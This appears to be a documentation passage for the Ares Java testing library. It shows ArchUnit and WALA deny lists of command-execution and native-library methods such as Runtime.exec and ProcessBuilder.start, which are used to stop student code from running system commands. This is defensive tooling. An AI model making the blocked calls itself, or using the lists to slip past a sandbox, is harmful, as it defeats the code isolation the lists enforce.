**Violation Example** (format of `security.architecture.method.call.message`):
```
'Executes commands'
 Method <de.student.StudentCode.exploit()> calls method <java.lang.ProcessBuilder.start()> in (ProcessBuilder.java:1170) accesses <de.student.StudentCode.exploit()>
```

**Best For:**
- Precise violation detection
- Understanding exact call paths
- Production-grade security validation
- Reducing false positives

---

### **Forbidden Method Templates**

Both modes load forbidden methods from text files. The files contain one method per line without return types; blank lines and `#` comment lines are ignored.

**ArchUnit File Format (source form):**
```
java.lang.Runtime.exec(java.lang.String)
java.lang.Runtime.exec(java.lang.String[])
java.lang.Runtime.exec(java.lang.String, java.lang.String[])
java.lang.Runtime.exec(java.lang.String[], java.lang.String[])
java.lang.Runtime.exec(java.lang.String, java.lang.String[], java.io.File)
java.lang.Runtime.exec(java.lang.String[], java.lang.String[], java.io.File)
java.lang.Runtime.load(java.lang.String)
java.lang.Runtime.loadLibrary(java.lang.String)
java.lang.ProcessBuilder.start()
java.lang.ProcessBuilder.<init>(java.util.List)
java.lang.ProcessBuilder.<init>(java.lang.String[])
java.lang.ProcessBuilder.startPipeline
```

**WALA File Format (JVM descriptor parameters, no return type):**
```
java.lang.Runtime.exec(Ljava/lang/String;)
java.lang.Runtime.exec([Ljava/lang/String;)
java.lang.Runtime.exec(Ljava/lang/String;[Ljava/lang/String;)
java.lang.Runtime.exec([Ljava/lang/String;[Ljava/lang/String;)
java.lang.Runtime.exec(Ljava/lang/String;[Ljava/lang/String;Ljava/io/File;)
java.lang.Runtime.exec([Ljava/lang/String;[Ljava/lang/String;Ljava/io/File;)
java.lang.Runtime.load(Ljava/lang/String;)
java.lang.Runtime.loadLibrary(Ljava/lang/String;)
java.lang.ProcessBuilder.start()
java.lang.ProcessBuilder.<init>(Ljava/util/List;)
java.lang.ProcessBuilder.<init>([Ljava/lang/String;)
java.lang.ProcessBuilder.startPipeline
```

**Template Locations:**
- ArchUnit: `src/main/resources/de/tum/cit/ase/ares/api/templates/architecture/java/archunit/methods/command-execution-methods.txt`
- WALA: `src/main/resources/de/tum/cit/ase/ares/api/templates/architecture/java/wala/methods/command-execution-methods.txt`

---

### **Integration Example**

**Maven Project Setup:**
```xml
<dependencies>
    <dependency>
        <groupId>de.tum.cit.ase</groupId>
        <artifactId>ares</artifactId>
        <version>2.0.1-Beta8</version>
    </dependency>
</dependencies>
```

**Test Class:**
```java
@Test
void testNoCommandExecution() {
    // Load student classes
    JavaClasses javaClasses = new ClassFileImporter()
        .importPackages("de.student");
    
    // Create test case
    JavaArchunitTestCase testCase = JavaArchunitTestCase.archunitBuilder()
        .javaArchitectureTestCaseSupported(JavaArchitectureTestCaseSupported.COMMAND_EXECUTION)
        .allowedPackages(Set.of())
        .javaClasses(javaClasses)
        .build();
    
    // Execute
    testCase.executeArchitectureTestCase("ARCHUNIT", "");
}
```

---

**The architecture testing approach provides comprehensive security validation at compile/test time, complementing the runtime AOP approach for defense-in-depth security against command execution attacks.**
